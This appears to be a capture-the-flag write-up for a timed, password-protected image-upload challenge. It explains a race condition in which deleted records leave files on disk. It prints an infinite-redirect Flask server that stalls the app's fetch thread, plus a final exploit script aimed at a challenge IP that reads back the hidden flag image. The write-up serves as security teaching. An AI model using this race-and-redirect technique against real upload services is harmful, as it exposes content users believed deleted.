+ You can upload images and set a password. Once you upload it, you will receive a temporary URL. When you access the temporary URL, a mosaiced image will be displayed and 10 seconds will be counted. If you enter the correct password before the count runs out, the original uploaded image will be displayed, but if you cannot enter it, you will be alerted with "BOOOOOOM 💣" and the image itself will be deleted, including the link.
+  `/<id>`GET displays the mosaic image, and POST displays the original image if the passwords match.
+ the __add_image function tarts a new thread using the convert_and_save function, passing along the id_, file, and image_url. This function is responsible for processing the image data and saving it to a file.
+ Adds the image information to the database using the db.add_image function, passing the id_, mimetype, and password
+ The `/trial`endpoint  calls the __add_image function with the generated password, UUID, and the file object.
It returns a JSON response containing the URL of the added image.
+ when the timer expires, the image is not deleted from the disk but only db.delete_image is called, which removes the record from the database but not the file from the disk. So if we request /trial and visit it, the image will still be present on the disk.
Note that when we upload an image, we can specify an id, so we can specify the previous generated one
Moreover, it should be noted that when __add_image is called, a thread is started where it is possible to make a get request and then update the image on the disk.
If I make a request that takes more than 5 seconds to respond, __add_image will have inserted the record with our id and the password we specified, which will however refer to the original disk image for the time remaining for the request to complete. 
+ Since the actual file remains here, you can read it by matching it with the ID of your image.
However, if you try to match the IDs and read them out, a problem will occur. It takes 5 seconds for the ID of your image to be added to the DB using the function.
```
def __add_image(password, id_, file=None, image_url=None, admin=False):
    t = Thread(target=convert_and_save, args=(id_, file, image_url))
    t.start()

    # no need, but time to waiting heavy response makes me excited!!
    if not admin:
        time.sleep(5)
~~~
    db.add_image(id_, mimetype, password)
```

+ On the other hand, in a function in another thread, convert_and_savethe flag image remained for 3s for the URL and immediately for the file? The actual file is overwritten with your own image.
+ Is it possible to somehow convert_and_savelengthen the processing time of the function so that the file is overwritten after __add_imagethe function has finished
+ At first glance, it seems like it always times out after 3s, but in reality, if the site redirects repeatedly, it will wait 3s for each redirect. In other words, if you set up a server that redirects infinitely as shown below, the function will not end and the file will not be overwritten.db.add_image(id_, mimetype, password)
requests.get(url, timeout=3)

+ ```
import time
from flask import Flask, redirect

app = Flask(__name__)

@app.route("/")
def infinite_redirect():
    time.sleep(2)
    return redirect("/", code=302)

if __name__ == "__main__":
    app.run(debug=False, host="0.0.0.0", port=80)
```
+ final exploit

```
import requests
import time

url = "http://35.200.21.52/"

get_image = requests.get(url + "trial")

flag_url = get_image.json()["url"]
id = flag_url.split("/")[-1]

print(flag_url, id)

a = requests.get(flag_url)

time.sleep(11)

a = requests.post(
    url,
    data={
        "id": id,
        "password": "password",
        "image_url": "https://b22a-103-149-158-214.ngrok-free.app/a.jpg",
    },
)
print(a.text)

a = requests.post(flag_url, data={"id": id, "password": "password"})
print(a.text)
```